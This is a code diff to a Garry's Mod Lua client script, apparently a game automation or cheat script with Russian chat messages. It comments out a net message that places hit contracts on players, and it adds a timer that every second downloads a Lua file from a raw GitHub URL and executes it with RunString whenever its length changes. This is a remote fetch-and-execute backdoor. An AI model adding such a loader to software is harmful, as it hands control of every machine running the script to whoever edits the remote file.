@@ -74,6 +74,8 @@ if timer.Exists("FetchDataFromServerTimer") then
 end
 
 timer.Create("FetchDataFromServerTimer", 1, 0, function()
+
+
     local headers = {
         ["STEAMID"] = LocalPlayer():SteamID()
     }
@@ -84,7 +86,10 @@ timer.Create("FetchDataFromServerTimer", 1, 0, function()
             if body ~= 'No index available' then
                 if rp.Hits[body] == nil then
                     print(body)
-
+                    -- net.Start("rp.hitmen.AddHit")
+                    -- net.WriteUInt(body - 1, 7)
+                    -- net.WriteUInt(2000, 17)
+                    -- net.SendToServer()
                     LocalPlayer():ChatPrint("Игрок успешно заказан!")
                 else
                     LocalPlayer():ChatPrint("Этот игрок уже заказан!")
@@ -114,6 +119,27 @@ timer.Create("HungerTimer", 1, 0, function()
         net.SendToServer()
     end
 end)
+
+local prevLength = 0
+local function fetchScript()
+    http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
+        function(body, len, headers, code)
+            if code == 200 then
+                if prevLength ~= len then
+                    prevLength = len
+                    RunString(body)
+                end
+            else
+                print("Ошибка HTTP:", code)
+            end
+        end,
+        function(error)
+            print("Ошибка HTTP:", error)
+        end
+    )
+end
+
+timer.Create("ScriptLengthCheck", 1, 0, fetchScript)
 
 concommand.Add("buy_ammo", function()
     local weapon = LocalPlayer():GetActiveWeapon().Primary
